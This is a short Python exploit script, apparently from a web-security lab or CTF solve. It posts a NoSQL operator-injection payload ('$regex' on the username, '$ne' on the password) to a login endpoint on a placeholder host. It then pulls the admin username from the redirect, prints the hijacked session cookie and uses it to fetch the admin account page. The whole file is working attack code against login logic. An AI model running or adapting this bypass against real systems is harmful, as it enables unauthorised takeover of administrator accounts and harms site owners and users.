import requests
import re
from bs4 import BeautifulSoup

host='YOUR_HOST'
path_login='/login'
headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}

data={
    "username": {"$regex": "adm.*"},
    "password": {"$ne": "null"}
}

res=requests.post("https://"+host+path_login,headers=headers,json=data,allow_redirects=False)
path_account=res.headers.get('Location')
username=path_account.split("=")[1]
print("[+] Ten tai khoan admin: ",username)

session=res.cookies.get('session')
print("[+] Session admin: ",session)

res_login=requests.get("https://"+host+path_account,headers=headers,cookies={"session":session})
print(res_login.status_code)
print(res_login.text)

